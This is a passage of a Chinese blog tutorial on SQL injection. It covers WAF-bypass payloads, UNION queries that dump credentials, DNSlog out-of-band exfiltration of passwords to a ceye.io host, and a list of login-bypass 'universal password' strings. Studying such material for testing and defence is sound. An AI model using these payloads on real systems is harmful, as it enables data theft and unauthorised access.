class="comment">/*!updatexml*/</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 拦截</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*!5000updatexml*/</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) 不拦截</span><br><span class="line"> </span><br><span class="line"> 接着我们需要在前面套壳，和盲注过狗的常规注入一样</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">and</span> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>)  拦截</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>) 拦截</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!and*/</span> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>) 拦截</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!%26%26*/</span> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>) 不拦截</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!||*/</span> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>) 不拦截</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!xor*/</span> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>) 不拦截</span><br><span class="line"></span><br><span class="line"> <span class="operator">|</span> <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>) 不拦截</span><br><span class="line"></span><br><span class="line"> xor <span class="comment">/*!11440updatexml*/</span>(<span class="number">1</span>,(<span class="keyword">select</span> hex(<span class="keyword">user</span><span class="comment">/**/</span>(<span class="comment">/**/</span>))),<span class="number">1</span>) 不拦截</span><br><span class="line"></span><br><span class="line">反引号应该也可以用来绕过</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and `updatexml`(1,(select hex(user/**/(/**/))),1)-- +</span></span><br></pre></td></tr></table></figure>

<p>​		<strong>结合right(),mid()函数读取一段字符串，使得取出来的数据完整。</strong></p>
<h3 id="杂项总结"><a href="#杂项总结" class="headerlink" title="杂项总结"></a>杂项总结</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">=</span>可以用<span class="keyword">like</span>或者<span class="operator">~</span><span class="operator">~</span>绕过</span><br><span class="line"><span class="comment">/**/</span>和<span class="comment">/*!*/</span>和<span class="comment">/*!5000*/</span>和<span class="comment">/*!11400*/</span>包裹字符可绕过</span><br><span class="line">seselectlect，ununionion双写绕过，大小写混写绕过（对抗简单的正则匹配）</span><br><span class="line">``反引号包裹绕过</span><br><span class="line">用()括号包裹、<span class="operator">%</span><span class="number">0</span>a适当加上<span class="comment">/**/</span>等进行拼接绕过</span><br><span class="line">空格也可用;<span class="operator">%</span><span class="number">00</span>绕过（<span class="operator">%</span><span class="number">0</span>a、<span class="operator">%</span><span class="number">0</span>b、<span class="operator">%</span><span class="number">0</span>c、<span class="operator">%</span><span class="number">09</span>、<span class="operator">%</span>a0也行）。</span><br><span class="line">利用PHP内置凭借符号.进行绕过，加上<span class="string">&#x27;&#x27;</span>辅助绕过</span><br><span class="line">url编码绕过</span><br><span class="line"><span class="literal">true</span>，<span class="literal">false</span>，<span class="operator">&amp;&amp;</span>，<span class="operator">||</span>，<span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">!</span>绕过</span><br><span class="line"><span class="keyword">from</span>后面表名绕过可用（），&#123;&#125;，[]包裹绕过</span><br></pre></td></tr></table></figure>

<p>​		编码绕过的话具体结合源代码，根据实际场景，黑盒可用base64猜测。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">多可控点的引号逃逸</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;可控点1&#x27;</span> <span class="keyword">and</span> title <span class="operator">=</span> <span class="string">&#x27;可控点2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;a\&#x27;</span> <span class="keyword">and</span> title <span class="operator">=</span> <span class="string">&#x27;or sleep(1)#&#x27;</span></span><br><span class="line">sleep()被执行，说明可控点<span class="number">2</span>的单引号逃逸出来。a\<span class="string">&#x27; and title = 为id的值</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符串截断</span><br><span class="line">当字符串输入长度限制为<span class="number">10</span>位，<span class="number">10</span>位后截断时，我们可以构造aaaaaaaaa<span class="string">&#x27;</span></span><br><span class="line"><span class="string">自动转义会变成aaaaaaaaa\&#x27;</span>,截取后变为aaaaaaaaa\</span><br><span class="line">?title<span class="operator">=</span>aaaaaaaaa<span class="string">&#x27;&amp;content=,1,1)(3,4,(select pwd from user limit 1),1)--+</span></span><br><span class="line"><span class="string">在insert into语句中就会新增两行数据</span></span><br><span class="line"><span class="string">aaaaaaaaa&#x27;</span>,       <span class="number">1</span>        <span class="number">1</span></span><br><span class="line"><span class="number">3</span>                 <span class="number">4</span>        password</span><br></pre></td></tr></table></figure>

<h3 id="补充：like-“-23”"><a href="#补充：like-“-23”" class="headerlink" title="补充：like[“%23”]"></a>补充：like[“%23”]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">正常语句：</span><br><span class="line">select * from users where id=1 ;</span><br><span class="line"></span><br><span class="line">测试功能：</span><br><span class="line">select * from users where id=1 like &quot;[%23]&quot;;          //发现查询出来的是空表</span><br><span class="line"></span><br><span class="line">那我们构造如下payload：</span><br><span class="line">select * from users where id=1 like &quot;[%23]&quot; union select * from users;</span><br><span class="line">	我们知道前面users where id=1 like &quot;[%23]&quot;这个是空，那它这条语句就相当于是select * from users</span><br><span class="line"></span><br><span class="line">id=-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line"></span><br><span class="line">//爆库</span><br><span class="line">id=-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,database/*!--+/*%0a()*/ --+</span><br><span class="line">//爆表</span><br><span class="line">id=-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables */where table_schema=&#x27;security&#x27;--+</span><br><span class="line">//爆列</span><br><span class="line">id=-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns */where table_name=&#x27;users&#x27;--+</span><br><span class="line">//爆字段</span><br><span class="line">id=-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,group_concat(id,username,password)from/*!--+/*%0ausers*/--+              </span><br></pre></td></tr></table></figure>

<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><p>​		DNSlog注入，也叫DNS带外查询，它是属于带外通信的一种(Out of Band,简称OOB)。</p>
<p>​		寻常的注入基本都是在同一个信道上面的，比如正常的get注入，先在url上插入payload做HTTP请求，然后得到HTTP返回包，没有涉及其他信道。而所谓的带外通信，至少涉及两个信道</p>
<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理</strong>：</h4><ol>
<li><p>攻击者先向web服务器提交payload语句，比如（<code>select load_file(concat(&#39;\\\\&#39;,&#39;攻击语句&#39;,.XXX.ceye.io\\abc))</code>）</p>
</li>
<li><p>其中的攻击语句被放到数据库中会被执行，生成的结果与后面的<code>.XXX.ceye.io\\abc</code>构成一个新的域名</p>
</li>
<li><p>这时<code>load_file()</code>就可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析</p>
</li>
<li><p>此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的**<code>ceye.io</code>**，这其实是一个开放的Dnslog平台（具体用法在官网可见），在<a target="_blank" rel="noopener" href="http://ceye.io上我们可以获取到有关`ceye.io`的dns查询信息.实际上在域名解析的过程中,是由顶级域名向下逐级解析的,我们构造的攻击语句也是如此,当它发现域名中存在`ceye.io`时,它会将这条域名信息转到相应的ns服务器上,而通过http//ceye.io%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%9F%A5%E8%AF%A2%E5%88%B0%E8%BF%99%E6%9D%A1DNS%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%E3%80%82">http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在`ceye.io`时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。</a></p>
<p>当然还有其他可以使用的DNSlog平台，如<a target="_blank" rel="noopener" href="http://www.dnslog.cn/%E3%80%82">http://www.dnslog.cn/。</a></p>
<p>这里我就使用<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a>, 它是一个免费的记录dnslog的平台，注册后到Profile页面会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来。</p>
</li>
</ol>
<h4 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h4><p>​		sql的布尔型盲注、时间注入的效率普遍很低且当注入的线程太大容易被waf拦截，并且像一些命令执行，xss以及sql注入攻击有时无法看到回显结果，这时就可以考虑DNSlog注入攻击</p>
<ol>
<li>SQL盲注</li>
<li>命令执行（无回显）</li>
<li>XSS（无回显）</li>
<li>SSRF(无回显)</li>
</ol>
<p>但有个重要条件：<strong>load_file()函数可以使用。也就是说需要配置文件my.ini中<code>secure_file_priv=</code></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">构造语法</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\&#x27;</span>,(<span class="keyword">select</span> database(),<span class="string">&#x27;mysql.cmr1ua.ceye.io\\abc&#x27;</span>)))</span><br><span class="line">获取数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select database()),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="string">&#x27;))--+</span></span><br><span class="line"><span class="string">获取数据表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.cmr1ua.ceye.io\\abc&#x27;</span>))<span class="comment">--+</span></span><br><span class="line">获取字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="string">&#x27;))--+</span></span><br><span class="line"><span class="string">获取表数据</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.cmr1ua.ceye.io\\abc&#x27;</span>))<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select username from users limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="string">&#x27;))--+</span></span><br><span class="line"><span class="string">因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 出来了再转回去</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> hex(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.cmr1ua.ceye.io\\abc&#x27;</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol>
<li><p>dnslog注入只能用于windows，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个&#x2F;&#x2F;，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有unc路径，也就无法使用dnslog注入。</p>
</li>
<li><p>在进行注入的时候，需要先使用测试代码判断该位置是否存在注入，然后再在后面拼接代码，因为对照pyload进行输入的话，可能会出现dnslog网站接收不到的情况，这是我在进行复现的时候遇到的情况。</p>
</li>
<li><p>在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。</p>
<h5 id="DNSlog注入脚本：https-github-com-ADOOO-DnslogSqlinj"><a href="#DNSlog注入脚本：https-github-com-ADOOO-DnslogSqlinj" class="headerlink" title="DNSlog注入脚本：https://github.com/ADOOO/DnslogSqlinj"></a>DNSlog注入脚本：<a target="_blank" rel="noopener" href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></h5></li>
</ol>
<h2 id="万能密码表"><a href="#万能密码表" class="headerlink" title="万能密码表"></a>万能密码表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">asp aspx:</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a </span><br><span class="line">or 1=1--</span><br><span class="line">&#x27;or 1=1--</span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line">&quot;or 1=1--</span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin&#x27;or 1=1 #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php:</span><br><span class="line">admin&#x27; or 1=1 #</span><br><span class="line">admin&#x27; or 1=1 --+</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">&quot;or 1=1--</span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&quot;or1=1--</span><br><span class="line">&quot;or=or&quot;</span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line">&#x27;or 1=1</span><br><span class="line">&#x27;or 1=1--</span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line">&#x27;or1=1--</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line">or 1=1--</span><br><span class="line">or1=1--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jsp</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">admin&#x27; or 1=1/*</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">https://blog.csdn.net/qq_44159028/article/details/114325805</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hackzkaq/article/details/112868185">https://blog.csdn.net/hackzkaq/article/details/112868185</a></p>
<p>《从0到1CTFer成长之路》</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">yake-daigua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/11/11/SQLI/">https://yake-daigua.top/2022/11/11/SQLI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">yake-daigua</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQLI/">SQLI</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/"><img class="prev-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTTP走私靶场</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/2193933.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅析NodeJS</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">yake-daigua</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yake-daigua的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">SQL注入知识点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%A6%82%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">SQL概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLI%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF-sql-injection"><span class="toc-number">1.2.</span> <span class="toc-text">SQLI常见姿势(sql injection)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">字符型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">单引号闭合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">双引号闭合</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">UNION联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#group%E9%87%8D%E5%A4%8D%E9%94%AE%E5%86%B2"><span class="toc-number">1.2.4.0.1.</span> <span class="toc-text">group重复键冲</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.0.2.</span> <span class="toc-text">extractvalue() 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.4.0.3.</span> <span class="toc-text">updatexml注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.2.4.0.4.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.5.0.1.</span> <span class="toc-text">布尔型盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.5.0.2.</span> <span class="toc-text">时间型盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.6.</span> <span class="toc-text">HTTP头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#User-Agent"><span class="toc-number">1.2.6.0.1.</span> <span class="toc-text">User-Agent</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie"><span class="toc-number">1.2.6.0.2.</span> <span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Referer"><span class="toc-number">1.2.6.0.3.</span> <span class="toc-text">Referer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#X-Forwarded-For"><span class="toc-number">1.2.6.0.4.</span> <span class="toc-text">X-Forwarded-For</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E7%9B%92"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">白盒</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">1.2.7.1.1.</span> <span class="toc-text">防御：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.8.</span> <span 